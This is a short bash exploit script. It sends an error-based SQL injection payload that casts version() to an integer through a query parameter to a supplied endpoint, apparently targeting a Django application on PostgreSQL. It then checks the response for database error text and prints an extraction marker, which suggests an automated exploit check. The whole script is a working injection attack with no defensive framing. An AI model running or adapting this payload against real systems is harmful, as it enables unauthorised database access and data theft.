#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"
PARAM="${2:-date}"

echo "=== 提取数据库版本 ==="
resp=$(curl -s "${ENDPOINT}/?${PARAM}=year%27%20AND%201%3DCAST(version()%20AS%20INTEGER)--%20" --max-time 15 2>/dev/null)
echo "$resp"
if echo "$resp" | grep -qi "PostgreSQL\|invalid input syntax"; then
  echo ""
  echo "DJANGO_SQLI_DATA_EXTRACTED"
fi
